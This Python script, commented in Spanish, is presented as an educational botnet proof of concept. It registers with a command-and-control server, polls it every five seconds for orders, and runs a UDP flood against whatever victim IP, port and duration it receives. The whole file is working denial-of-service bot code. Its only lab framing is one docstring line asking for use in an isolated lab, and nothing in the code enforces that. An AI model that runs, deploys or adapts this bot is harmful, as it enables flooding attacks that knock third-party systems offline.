#!/usr/bin/env python3
"""
Bot / zombie - PoC educativa de botnet.
Pregunta al C&C por su orden mediante polling HTTP y la ejecuta.
Uso solo en un laboratorio aislado y controlado.
"""
import socket
import time
import requests

CC = "http://localhost:8000"
BOT_ID = "bot1"

# Tamano del paquete que mandamos a la victima
PAYLOAD = b"X" * 1024


def atacar(ip_victima, puerto_victima, duracion):
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    fin = time.time() + duracion
    enviados = 0
    print(f"[BOT] Atacando {ip_victima}:{puerto_victima} durante {duracion}s...")
    while time.time() < fin:
        try:
            s.sendto(PAYLOAD, (ip_victima, puerto_victima))
            enviados += 1
        except OSError:
            pass
    s.close()
    print(f"[BOT] Ataque terminado. Paquetes enviados: {enviados}")


def ejecutar(orden):
    tipo = orden.get("tipo")
    params = orden.get("parametros", {})
    ip = params.get("ip")
    puerto = params.get("puerto")
    duracion = params.get("duracion")
    if tipo == "ataque":
        atacar(ip, int(puerto), int(duracion))


if __name__ == "__main__":
    # registro al arrancar
    requests.post(f"{CC}/registro", json={"id": BOT_ID})
    # polling: pregunta su orden cada 5s
    while True:
        r = requests.get(f"{CC}/ordenes/{BOT_ID}")
        orden = r.json().get("orden")
        if orden:
            ejecutar(orden)
        time.sleep(5)
